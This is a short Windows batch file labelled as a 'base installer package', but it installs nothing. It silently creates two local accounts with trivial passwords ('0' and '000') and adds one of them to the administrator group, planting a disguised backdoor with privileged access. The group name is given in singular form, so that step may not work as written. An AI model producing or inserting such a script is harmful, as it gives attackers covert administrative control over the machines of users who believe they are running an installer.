@echo off
@rem The x34 base installer package
net user x34 0 /ADD
net user x34sys 000 /ADD
net localgroup administrator x34sys /add